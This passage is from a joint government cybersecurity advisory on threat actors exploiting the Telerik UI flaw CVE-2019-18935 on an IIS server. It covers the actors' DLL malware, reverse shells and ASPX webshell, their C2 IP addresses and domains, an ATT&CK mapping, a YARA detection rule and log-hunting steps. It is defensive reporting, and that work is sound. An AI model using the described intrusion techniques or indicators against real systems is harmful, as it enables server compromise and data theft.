<p>At least nine DLL files used for discovery [<a href="https://attack.mitre.org/versions/v12/tactics/TA0007/" title="Discovery">TA0007</a>], C2 [<a href="https://attack.mitre.org/versions/v12/tactics/TA0011/" title="Command and Control">TA0011</a>], and defense evasion [<a href="https://attack.mitre.org/versions/v12/tactics/TA0005/" title="Defense Evasion">TA0005</a>]. All of the analyzed samples have network parameters, including host name, domain name, Domain Name System (DNS) server Internet Protocol (IP) address and machine name, Network Basic Input/Output System (NetBIOS) ID, adapter information, IP address, subnet, gateway IP, and Dynamic Host Configuration Protocol (DHCP) server [<a href="https://attack.mitre.org/versions/v12/techniques/T1016/" title="System Network Configuration Discovery">T1016</a>]. All analyzed samples communicate this collected data to a C2 server at IP address 1<code>37.184.130[.]162</code> or <code>45.77.212[.]12</code>. The C2 traffic to these IP addresses uses a non-application layer protocol [<a href="https://attack.mitre.org/versions/v12/techniques/T1095/" title="Non-Application Layer Protocol">T1095</a>] by leveraging Transmission Control Protocol (TCP) clear text (i.e., unencrypted) over port 443. Analysis also identified that:</p>
<ul><li>Some of the analyzed samples can load additional libraries; enumerate the system, processes, files, directories [<a href="https://attack.mitre.org/versions/v12/techniques/T1083/" title="File and Directory Discovery">T1083</a>]; and write files.</li>
<li>Other analyzed samples can delete DLL files ending with the <code>.dll</code> extension in the <code>C:\Windows\Temp\</code> directory on the server. TA1 may use this capability to hide additional malicious activity on the network.</li>
</ul><p>CISA, in coordination with the authoring organizations, identified and observed the following threat actor IPs and timestamps associated with this activity:</p>
<table class="MsoTableGrid tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 1: Observed TA1 IPs and Timestamps</em></caption>
<thead><tr><td>
<p><strong>IP Address</strong></p>
</td>
<td>
<p><strong>First Identified</strong></p>
</td>
<td>
<p><strong>Last Identified</strong></p>
</td>
</tr></thead><tbody><tr><td>
<p>137.184.130[.]162</p>
</td>
<td>
<p>09/26/2022</p>
</td>
<td>
<p>10/08/2022</p>
</td>
</tr><tr><td>
<p>45.77.212[.]12</p>
</td>
<td>
<p>10/07/2022</p>
</td>
<td>
<p>11/25/2022</p>
</td>
</tr><tr><td>
<p>104.225.129[.]102</p>
</td>
<td>
<p>10/10/2022</p>
</td>
<td>
<p>11/16/2022</p>
</td>
</tr><tr><td>
<p>149.28.85[.]24</p>
</td>
<td>
<p>10/12/2022</p>
</td>
<td>
<p>10/17/2022</p>
</td>
</tr><tr><td>
<p>185.186.245[.]72</p>
</td>
<td>
<p>10/18/2022</p>
</td>
<td>
<p>10/18/2022</p>
</td>
</tr><tr><td>
<p>193.8.172[.]113</p>
</td>
<td>
<p>09/25/2022</p>
</td>
<td>
<p>09/25/2022</p>
</td>
</tr><tr><td>
<p>193.8.172[.]13</p>
</td>
<td>
<p>09/25/2022</p>
</td>
<td>
<p>10/17/2022</p>
</td>
</tr><tr><td>
<p>216.120.201[.]12</p>
</td>
<td>
<p>10/13/2022</p>
</td>
<td>
<p>11/10/2022</p>
</td>
</tr><tr><td>
<p>5.34.178[.]246</p>
</td>
<td>
<p>09/25/2022</p>
</td>
<td>
<p>09/25/2022</p>
</td>
</tr><tr><td>
<p>79.133.124[.]242</p>
</td>
<td>
<p>09/25/2022</p>
</td>
<td>
<p>09/25/2022</p>
</td>
</tr><tr><td>
<p>92.38.169[.]193</p>
</td>
<td>
<p>09/27/2022</p>
</td>
<td>
<p>10/08/2022</p>
</td>
</tr><tr><td>
<p>92.38.176[.]109</p>
</td>
<td>
<p>09/12/2022</p>
</td>
<td>
<p>09/25/2022</p>
</td>
</tr><tr><td>
<p>92.38.176[.]130</p>
</td>
<td>
<p>09/25/2022</p>
</td>
<td>
<p>10/07/2022</p>
</td>
</tr></tbody></table><h5>Threat Actor 2</h5>
<p>TA2—identified as likely the cybercriminal actor XE Group—often includes <code>xe[word]</code> nomenclature in original filenames and registered domains. Volexity lists this naming convention and other observed TTPs as common for this threat actor group.[<a href="https://www.volexity.com/blog/2021/12/07/xe-group-exposed-8-years-of-hacking-card-skimming-for-profit/" title="XE Group – Exposed: 8 Years of Hacking & Card Skimming for Profit">4</a>]</p>
<p>As early as August 2021, CISA and authoring organizations observed TA2 delivering malicious PNG files that, following analysis, were masqueraded DLL files to avoid detection [<a href="https://attack.mitre.org/versions/v12/techniques/T1036/005/" title="Masquerading: Match Legitimate Name or Location">T1036.005</a>]. Similar to TA1, TA2 exploited CVE-2019-18935 and was able to upload at least three unique DLL files into the <code>C:\Windows\Temp\</code> directory that TA2 executed via the <code>w3wp.exe</code> process. These DLL files drop and execute reverse (remote) shell utilities for unencrypted communication with C2 IP addresses associated with the malicious domains listed in Table 2. <strong>Note:</strong> At the time of analysis, the domains resolved to the listed IP addresses.</p>
<table class="MsoTableGrid"><caption><em>Table 2: TA2 IPs and Resolving Domains</em></caption>
<tbody><tr><th>
<p><strong>IP Address</strong></p>
</th>
<th>
<p><strong>Resolving Domains</strong></p>
</th>
</tr><tr><td>
<p>184.168.104[.]171</p>
</td>
<td>
<p>xework[.]com</p>
<p>xegroups[.]com</p>
<p>hivnd[.]com</p>
</td>
</tr><tr><td>
<p>144.96.103[.]245</p>
</td>
<td>
<p>xework[.]com</p>
</td>
</tr></tbody></table><p>Analysis of DLL files determined the files listed in Table 3 were dropped, decoded, and attempted to connect to the respective malicious domains. Embedded payloads dropped by the DLL files were observed using the command line utility <code>certutil[.]exe</code> and writing new files as <code>xesvrs[.]exe</code> to invoke reverse shell utilities execution.</p>
<table class="MsoTableGrid"><caption><em>Table 3: Identified Malicious Files</em></caption>
<tbody><tr><th>
<p><strong>Filename</strong></p>
</th>
<th>
<p><strong>Description</strong></p>
</th>
</tr><tr><td>
<p>XEReverseShell.exe</p>
</td>
<td>
<p>DLL files (masqueraded as PNG files) located in the <code>C:\Windows\Temp\</code> directory contain a base64 encoded file with the internal name <code>XEReverseShell.exe</code>, which was dropped into the same directory as <code>sortcombat.exe</code>.</p>
<p>When executed, the reverse shell utility attempts to connect to <code>xework[.]com</code> or <code>xegroups[.]com</code> to obtain the IP address of the C2 server and port number for unencrypted communication.</p>
<p><strong>Note: </strong>It is likely the threat actors changed the file extension from .dll to .png to avoid detection.</p>
</td>
</tr><tr><td>
<p>Multi-OS_ReverseShell.exe</p>
</td>
<td>
<p>Reverse shell utility decoded from the base64 encoded file <code>xesmartshell.tmp</code>.</p>
<p>When executed, it will attempt to connect to <code>xegroups[.]com</code> or <code>xework[.]com</code> to obtain the IP address of the C2 server and port number for unencrypted communication.</p>
</td>
</tr><tr><td>
<p>SortVistaCompat</p>
</td>
<td>
<p>Base64 encoded payload dropped from <code>Multi-OS_ReverseShell.exe</code>. This file receives the C2 IP and port from <code>xework[.]com</code>.</p>
</td>
</tr></tbody></table><p> When the TA2 malware is executed a DLL file drops an executable (<code>XEReverseShell.exe</code>) that attempts to pull a C2 IP address and port number from <code>xework[.]com</code> or <code>xegroups[.]com</code>.</p>
<ul><li>If no port or IP address is found, the program will exit.</li>
<li>If a port and IP address are found, the program will establish a listener and wait for further commands.</li>
</ul><p>If communication is established between the TA2 malware and the C2:</p>
<ul><li>The malware will identify the operating system (Windows or Linux) and create the appropriate shell (cmd or bash), sending system information back to the C2.</li>
<li>The C2 server may send the command <code>xesetshell</code>, causing the malware to connect to the server and download a file called small.txt—a base64-encoded webshell that the malware decodes and places in the <code>C:\Windows\Temp\</code> directory.</li>
<li>The C2 server may send the command <code>xequit</code>, causing the malware to sleep for a period of time determined by the threat actors.</li>
</ul><p>The two files <code>xesmartshell.tmp</code> and <code>SortVistaCompat</code> have the capability to drop an Active Server Pages (ASPX) webshell—a base64 encoded text file <code>small.txt</code> decoded [<a href="https://attack.mitre.org/versions/v12/techniques/T1140/" title="Deobfuscate/Decode Files or Information">T1140</a>] as <code>small.aspx</code> [<a href="https://attack.mitre.org/versions/v12/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a>]—to enumerate drives; to send, receive, and delete files; and to execute incoming commands. The webshell contains an interface for easily browsing files, directories, or drives on the system, and allows the user to upload or download files to any directory. No webshells were observed to be dropped on the target system, likely due to the abused service account having restrictive write permissions.</p>
<p>For more information on the DLLs, binaries, and webshell, see CISA <a href="https://www.cisa.gov/news-events/analysis-reports/ar23-074a" title="MAR-10413062-1.v1 Telerik Vulnerability in U.S. Government IIS Server">MAR-10413062-1.v1 Telerik Vulnerability in U.S. Government IIS Server</a>.</p>
<h4><strong>MITRE ATT&CK TACTICS AND TECHNIQUES</strong></h4>
<p>See Table 4 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s <a href="https://www.cisa.gov/news-events/alerts/2023/03/01/cisa-releases-decider-tool-help-mitre-attck-mapping" title="CISA Releases Decider Tool to Help with MITRE ATT&CK Mapping">Decider Tool</a> and <a href="https://www.cisa.gov/news-events/alerts/2023/01/17/cisa-updates-best-practices-mapping-mitre-attckr" title="CISA Updates Best Practices for Mapping to MITRE ATT&CK®">Best Practices for MITRE ATT&CK Mapping Guide</a>.</p>
<table><caption><em>Table 4: Identified ATT&CK Techniques for Enterprise</em></caption>
<tbody><tr><th>
<p><strong>Reconnaissance</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><a><strong>Technique Title</strong></a></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Active Scanning: Vulnerability Scanning</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a></p>
</td>
<td>
<p>Actors were observed conducting active scanning activity for vulnerable devices and specific ports.</p>
</td>
</tr><tr><th>
<p><strong>Initial Access</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Exploit Public-Facing Application</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a></p>
</td>
<td>
<p>Actors exploited a known vulnerability in the Microsoft IIS server.</p>
</td>
</tr><tr><th>
<p><strong>Persistence</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Server Software Component: Web Shell</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a></p>
</td>
<td>
<p>TA2’s malware dropped an ASPX webshell to enumerate drives; send, receive, and delete files; and execute commands.</p>
</td>
</tr><tr><th>
<p><strong>Defense Evasion</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Masquerading: Match Legitimate Name or Location</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1036/005/" title="Masquerading: Match Legitimate Name or Location">T1036.005</a></p>
</td>
<td>
<p>Actors leveraged the legitimate <code>w3wp.exe</code> process on the IIS server to write malicious DLL files and evade detection.</p>
</td>
</tr><tr><td>
<p>Process Injection: DLL Injection</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1055/001/" title="Process Injection: DLL Injection">T1055.001</a></p>
</td>
<td>
<p>Actors loaded newly created DLLs into a running <code>w3wp.exe</code> process.</p>
</td>
</tr><tr><td>
<p>Indicator Removal: File Deletion</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1070/004/" title="Indicator Removal: File Deletion">T1070.004</a></p>
</td>
<td>
<p>TA1’s malware deleted files with ".dll" from the <code>C:\Windows\Temp\</code> directory, which may indicate hidden malicious activity on the network.</p>
</td>
</tr><tr><td>
<p>Indicator Removal: Timestomp</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1070/006/" title="Indicator Removal: Timestomp">T1070.006</a></p>
</td>
<td>
<p>Actors modified file time attributes to insert misleading creation dates.</p>
</td>
</tr><tr><td>
<p>Decode Files</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1140/" title="Decode Files">T1140</a></p>
</td>
<td>
<p>The base64 encoded text file <code>small.txt</code> decoded as the webshell <code>small.aspx</code>.</p>
</td>
</tr><tr><th>
<p><strong>Discovery</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>File and Directory Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1083/" title="File and Directory Discovery">T1083</a></p>
</td>
<td>
<p>Actors enumerated the IIS server via OS fingerprinting, executed Windows processes, and collected network information.</p>
<p>TA1’s malware enumerates systems, processes, files, and directories.</p>
</td>
</tr><tr><td>
<p>System Network Configuration Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1016/" title="System Network Configuration Discovery">T1016</a></p>
</td>
<td>
<p>TA1’s malware gathers network parameters, including host name, domain name, DNS servers, NetBIOS ID, adapter information, IP address, subnet, gateway IP, and DHCP server.</p>
</td>
</tr><tr><th>
<p><strong>Command and Control</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Ingress Tool Transfer</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a></p>
</td>
<td>
<p>TA1 and TA2 uploaded malicious DLL files (some masqueraded as PNG files) to the <code>C:\Windows\Temp\</code> directory.</p>
</td>
</tr><tr><td>
<p>Non-Application Layer Protocol</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1095/" title="Non-Application Layer Protocol">T1095</a></p>
</td>
<td>
<p>Actors used a non-application layer protocol (TCP) for <code>w3wp.exe</code> process exploitation, C2, and enumeration on the IIS server.</p>
</td>
</tr></tbody></table><h4><strong>DETECTION METHODS</strong></h4>
<p>CISA and authoring organizations recommend that organizations review the steps listed in this section and Table 4: Identified ATT&CK Techniques for Enterprise to detect similar activity on IIS servers.</p>
<h5><strong>Yara Rule</strong></h5>
<p>CISA developed the following YARA rule from the base proof-of-concept code for CVE-2019-18935.[<a href="https://github.com/noperator/CVE-2019-18935/blob/master/CVE-2019-18935.py" title="noperator / CVE-2019-18935">5</a>] <strong>Note:</strong> Authoring organizations do not guarantee all malicious DLL files (if identified) will use the same code provided in this YARA rule.</p>
<p><code>rule CISA_10424018_01 {<br />
meta:<br />
        Author = "CISA Code & Media Analysis"<br />
        Incident = "10424018"<br />
        Date = "2023-02-07"<br />
        Last_Modified = "20230216_1500"<br />
        Actor = "n/a"<br />
        Family = "n/a"<br />
        Capabilities = "n/a"<br />
        Malware_Type = "n/a"<br />
        Tool_Type = "n/a"<br />
        Description = "Detects open-source exploit samples"<br />
        SHA256 = "n/a"<br />
    strings:<br />
        $s0 = { 3D 20 7B 20 22 63 6D 22 2C 20 22 64 2E 65 22 2C }<br />
        $s1 = { 20 22 78 22 2C 20 22 65 22 20 7D 3B }<br />
        $s2 = { 52 65 76 65 72 73 65 53 68 65 6C 6C 28 29 }<br />
        $s3 = { 54 65 6C 65 72 69 6B 20 55 49 }<br />
        $s4 = { 66 69 6C 65 6E 61 6D 65 5F 6C 6F 63 61 6C }<br />
        $s5 = { 66 69 6C 65 6E 61 6D 65 5F 72 65 6D 6F 74 65 }<br />
        $s6 = { 41 55 43 69 70 68 65 72 2E 65 6E 63 72 79 70 74 }<br />
        $s7 = { 31 32 31 66 61 65 37 38 31 36 35 62 61 33 64 34 }<br />
$s8 = { 43 6F 6E 6E 65 63 74 53 74 61 67 69 6E 67 53 65 72 76 65 72 28 29 }<br />
        $s9 = { 53 74 61 67 69 6E 67 53 65 72 76 65 72 53 6F 63 6B 65 74 }<br />
        $s10 = { 2A 62 75 66 66 65 72 20 3D 20 28 75 6E 73 69 67 6E 65 }<br />
$s11 = { 28 2A 29 28 29 29 62 75 66 66 65 72 3B 0A 20 20 20 20 66 75 6E 63 28 29 3B }<br />
$s12 = { 75 70 6C 6F 61 64 28 70 61 79 6C 6F 61 64 28 54 65 6D 70 54 61 72 67 65 74 }<br />
        $s13 = { 36 32 36 31 36 66 33 37 37 35 36 66 32 66 }<br />
    condition:<br />
($s0 and $s1 and $s2) or ($s3 and $s4 and $s5 and $s6 and $s7) or ($s8 and $s9 and $s10 and $s11) or ($s12 and $s13)<br />
}</code></p>
<h5><strong>Log Collection, Retention, and Analysis</strong></h5>
<p>CISA, FBI, and MS-ISAC recommend that organizations utilize a centralized log collection and monitoring capability, as well as implement or increase logging and forensic data retention. Longer retention policies improve the availability of data for forensic analysis and aid thorough identification of incident scope.</p>
<ul><li><strong>Centralized log collection and monitoring</strong> allows for the discovery of webshell and other exploit activity. For example, organizations should monitor for external connections made from the IIS server to unknown external IP addresses. Logging may also be available—if enabled at the router or firewall—for any outbound connections initiated with PowerShell.</li>
<li><strong>Access- and security-focused firewall (e.g., Web Application Firewall [WAF]) logs</strong> can be collected and stored for use in both detection and forensic analysis activities. Organizations should use a WAF to guard against publicly known web application vulnerabilities, in addition to guarding against common web application attacks.</li>
</ul><h5><strong>Creation of Malicious DLLs</strong></h5>
<p>CISA, FBI, and MS-ISAC recommend that organizations use <strong>process monitoring</strong>—which provides visibility into file system and application process activity—to detect suspicious executable files running from the <code>C:\Windows\Temp\</code> directory. Process monitoring via Windows Event Code 4688 will detect the legitimate <code>w3wp.exe</code> process running suspicious DLL files and other anomalous child processes. <strong>Note:</strong> Enabling this event may inundate security event logging. Use centralized log collection to prevent log rollover, increase log retention and archiving, and/or enable command line event logging.</p>
<p>Forensic analysis commonly identified the threat actors taking the following steps:</p>
<ol><li>Create one of the DLL files (<code>C:\Windows\Temp\1665890187.8690152.dll</code>) by process <code>w3wp.exe</code> PID 6484.</li>
<li>Load the newly created DLL into a currently running IIS process, <code>w3wp.exe</code> PID 6484. </li>
<li>Make a TCP connection using <code>w3wp.exe</code> PID 6484 to <code>45.77.212[.]12</code> over port 443.</li>
<li>Invoke <code>C:\Windows\System32\vcruntime140.dll</code> (Windows C runtime library) to execute payload.</li>
</ol><p>Steps 1 and 2 occur every time a malicious DLL file is created. In some cases, an ASP .NET temp file was created, but this may have indicated benign IIS server activity. <strong>Note:</strong> The Process ID (PID) used in this example is unique to this investigation and is not universal. IP address <code>45.77.212[.]12</code> correlates to TA1, but the pattern can be used as general practice to identify similar activity.</p>
<h5><strong>Additional Searching for IIS Servers</strong></h5>
<p>The following information was derived from artifact analysis and is provided to equip IT infrastructure defenders searching for similar activity on an IIS server. Several artifacts can be referenced to assist in determining if CVE-2019-18935 has been successfully exploited.</p>
<h5><em><strong>File Type: DLL</strong></em></h5>
<h5><em>Location: - %SystemDrive%\Windows\Temp\</em></h5>
<p>When this CVE is exploited, it uploads malicious DLL files to the <code>C:\Windows\Temp\</code> directory. The malicious DLL file naming convention translates to the exact time the file was uploaded to the server.</p>
<p>The time is represented in a series of digits, known as Unix Epoch time. The files observed during this investigation contained two sets of digits separated by a period (.) before the DLL extension (.dll). <em>Example: <code>1667206973.2270932.dll</code></em></p>
<p>Nearly all recovered files contain a series of 10 digits to the left of the period (.) and seven digits to the right. However, one file contained only five digits in the second set, which should be taken into consideration when writing regex patterns to search for the existence of these files. <em>Example Regex: <code>\d{10}\.\d{1,8}\.dll</code></em></p>
<p>These numbers can be copied and translated from digits into readable language with the month, day, year, hour, minute, and seconds displayed.</p>
<h5><em><strong>Log Type: IIS</strong></em></h5>
<h5><em>Location: - %SystemDrive%\inetpub\logs\LogFiles</em></h5>
<p>When investigating IIS logs, specific fields were searched for and captured during the time of each connection.</p>
<p>If the Unix Epoch time signature has been translated from a DLL filename, specific logs can be searched based on that time. However, if the Unix Epoch time signature has not been translated, the following will still work, but may take longer for the query to run.</p>
<p>The four most important fields to identify this traffic are noted in the following table. These descriptions are sourced directly from Microsoft.[<a href="https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis" title="Configure Logging in IIS">6</a>]</p>
<table class="MsoTableGrid tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 5: Four Fields Searched in IIS Logs</em></caption>
<thead><tr><td>
<p><strong>General Name</strong></p>
</td>
<td>
<p><strong>Field Name</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
</tr></thead><tbody><tr><td>
<p>Method</p>
</td>
<td>
<p>cs-method</p>
</td>
<td>
<p>Requested action; for example, a GET method</p>
</td>
</tr><tr><td>
<p>URI Stem</p>
</td>
<td>
<p>cs-uri-stem</p>
</td>
<td>
<p>Universal Resource Identifier (URI), or target, of the action</p>
</td>
</tr><tr><td>
<p>URI Query</p>
</td>
<td>
<p>cs-uri-query</p>
</td>
<td>
<p>The query, if any, that the client was trying to perform; A URI query is necessary only for dynamic pages.</p>
</td>
</tr><tr><td>
<p>Protocol Status</p>
</td>
<td>
<p>sc-status</p>
</td>
<td>
<p>Hypertext Transfer Protocol (HTTP) or File Transfer Protocol (FTP) status code</p>
</td>
</tr></tbody></table><p><strong>Note:</strong> Depending on how logs are collected and stored, the field names may not be an exact match; this should be taken into consideration when constructing queries.</p>
<p>When ingesting logs into security information and event management (SIEM), the final field names did not use a hyphen (-) but used an underscore (_).</p>
<p><em>Example: cs_method instead of cs-method</em></p>
<h5><em>Artifacts:</em></h5>
<table class="MsoTableGrid"><caption><em>Table 6: Information Contained in Two Observed IIS Events</em></caption>
<tbody><tr><th>
<p><strong>Field Name</strong></p>
</th>
<th>
<p><strong>Artifact</strong></p>
</th>
</tr><tr><td>
<p>cs-method</p>
</td>
<td>
<p>POST</p>
</td>
</tr><tr><td>
<p>>cs-uri-stem</p>
</td>
<td>
<p>/Telerik.Web.UI.WebResource.axd</p>
</td>
</tr><tr><td>
<p>cs-uri-query</p>
</td>
<td>
<p>type=rau</p>
</td>
</tr><tr><td>
<p>sc-status</p>
</td>
<td>
<p>200 and 302</p>
</td>
</tr></tbody></table><p>When reviewing logs, two IIS events were observed with the same timestamp each time this CVE-2019-18935 was exploited. Both events contained the same information in the cs-method, cs-uri-stem, and cs-uri-query. One event had a sc-status of 200 and the other had a sc-status of 302.</p>
<h5><em><strong>Log Type: Windows Event Application Logs</strong></em></h5>
<h5><em>Location: -%SystemDrive%\Windows\System32\winevt\logs\Application.evtx</em></h5>
<p>Kroll Artifact Parser and Extractor (KAPE), a forensic artifact collector and parser, was used to extract the Windows event logs from a backup image of the compromised IIS server. All field names refer to the labels provided via KAPE exports. The strings are of value and can be used to locate other artifacts if different tools are used. <strong>Note:</strong> The payload data in the following table has been shortened to only necessary strings to obscure and protect victim information.</p>
<table class="MsoTableGrid"><caption><em>Table 7: Example Payload Data</em></caption>
<tbody><tr><th>
<p><strong>EventID</strong></p>
</th>
<th>
<p><strong>Payload</strong></p>
</th>
</tr><tr><td>
<p>1309</p>
</td>
<td>
<p>3005, An unhandled exception has occurred[*redacted*]w3wp.exe[*redacted*]InvalidCastException, Unable to cast object of type 'System.Configuration.Install.AssemblyInstaller' to type 'Telerik.Web.UI.IAsyncUploadConfiguration'.\n at Telerik.Web.UI.AsyncUploadHandler.GetConfiguration(String rawData)\n at Telerik.Web.UI.AsyncUploadHandler.EnsureSetup()\n at Telerik.Web.UI.AsyncUploadHandler.ProcessRequest(HttpContext context)\n at Telerik.Web.UI.HandlerRouter.ProcessHandler(String handlerKey, HttpContext context)\n at Telerik.Web.UI.WebResource.ProcessRequest(HttpContext context)\n at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()\n at System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)\n at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously)\n\n, [*redacted*]/Telerik.Web.UI.WebResource.axd?type=rau, /Telerik.Web.UI.WebResource.axd, [*redacted*], False, [*redacted*], 15, [*redacted*], False, at Telerik.Web.UI.AsyncUploadHandler.GetConfiguration(String rawData)\n at Telerik.Web.UI.AsyncUploadHandler.EnsureSetup()\n at Telerik.Web.UI.AsyncUploadHandler.ProcessRequest(HttpContext context)\n at Telerik.Web.UI.HandlerRouter.ProcessHandler(String handlerKey, HttpContext context)\n at Telerik.Web.UI.WebResource.ProcessRequest(HttpContext context)\n at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()\n at System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)\n at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously)\n","Binary":""}}</p>
</td>
</tr></tbody></table><p>Authoring organizations recommend looking for the following key strings in the payload:</p>
<ul><li><code>w3wp.exe</code>: This is the parent process that executes the code inside the malicious DLLs.</li>
<li><code>System.Configuration.Install.AssemblyInstaller</code>: Figure 1 is from the creator’s GitHub repo,[<a href="https://github.com/noperator/CVE-2019-18935" title="noperator / CVE-2019-18935">7</a>] where the string can be observed in the code. As presented by Bishop Fox and proven during authoring organizations’ investigation of IIS server logs, an exception does not mean that the exploit failed, but more likely that it executed successfully.[<a href="https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui" title="CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI">3</a>]</li>
</ul><figure class="c-figure c-figure--image u-align-center" role="group"><div class="c-figure__media">    <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-03/threat_actor_assembly_installer.png?itok=HoHLLiTc" width="279" height="53" alt="Figure 1: Threat Actor Assembly Installer" /></div>
      <figcaption class="c-figure__caption"><em>Figure 1: Threat Actor Assembly Installer</em></figcaption></figure><p>If a Werfault crash report was written, Windows event application logs may contain evidence of this— even if the DLLs have been removed from the system as part of a cleanup effort by the threat actors.</p>
<table class="MsoTableGrid"><caption><em>Table 8: Example Threat Actor Cleanup</em></caption>
<tbody><tr><th>
<p><strong>EventID</strong></p>
</th>
<th>
<p><strong>ExecutableInfo</strong></p>
</th>
<td>
<p><strong>MapDescription</strong></p>
</td>
<td>
<p><strong>Payload</strong></p>
</td>
</tr><tr><td>
<p>1000</p>
</td>
<td>
<p>w3wp.exe |1664175639.65719.dll</p>
<p>|c:\windows\system32\inetsrv\w3wp.exe |C:\Windows\Temp\1664175639.65719.dll</p>
</td>
<td>
<p>Application Error</p>
</td>
<td>
<p>{"EventData":{"Data":"w3wp.exe, 8.5.9600.16384, 5215df96, 1664175639.65719.dll, 0.0.0.0, 63314d94, c00000fd, 00000000000016f8, 1708, 01d8d0a5f84af443, c:\\windows\\system32\\inetsrv\\w3wp.exe, C:\\Windows\\Temp\\1664175639.65719.dll, eed89eeb-3d68-11ed-817c-005056990ed7","Binary":""}}</p>
</td>
</tr><tr><td>
<p>1001</p>
</td>
<td>
<p>w3wp.exe |1664175639.65719.dll |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe</p>
</td>
<td>
<p>Application Crash</p>
</td>
<td>
<p>{"EventData":{"Data":"0, APPCRASH, Not available, 0, w3wp.exe, 8.5.9600.16384, 5215df96, 1664175639.65719.dll, 0.0.0.0, 63314d94, c00000fd, 00000000000016f8, \nC:\\Windows\\Temp\\WERE3F6.tmp.appcompat.txt\nC:\\Windows\\Temp\\WERE639.tmp.WERInternalMetadata.xml\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656\\memory.hdmp\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656\\triagedump.dmp, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656, 0, eed89eeb-3d68-11ed-817c-005056990ed7, 4","Binary":""}}</p>
</td>
</tr></tbody></table><p>The EventID field maps to Windows EventIDs for an easy filter. Users can leverage the Windows EventIDs to find malicious DLL with the Unix Epoch time-based name inside the C:\Windows\Temp\ directory.</p>
<p>Depending how log analysis is performed, various filters can be determined. However, if regex is available, the example listed in Table 8 above can be reused to match the Unix Epoch timestamp convention to assist in filtering.</p>
<h5><em>Additional Analysis</em></h5>
<p>When evidence of malicious DLLs is found, reverse engineering will need to be conducted to fully understand what actions occur as the malicious files could do nearly anything. Leveraging Windows security event logs, as well as Windows PowerShell logs, may provide insight into what actions the DLLs are taking. CISA and authoring organizations recommend the following process:</p>
<ol><li><a href="https://gchq.github.io/CyberChef/#recipe=From_UNIX_Timestamp('Seconds%20(s)')&input=MTU5NjgzNTMyOQ" title="UNIX Timestamp Converter">Convert</a> any discovered malicious DLL timestamps to readable format.</li>
<li>Export the Windows security event and PowerShell logs from the device.
<ul><li><em>Default path: %SystemDrive%\Windows\System32\winevt\logs\Windows PowerShell</em></li>
<li><em>Default path: %SystemDrive%\Windows\System32\winevt\logs\Security.evtx</em></li>
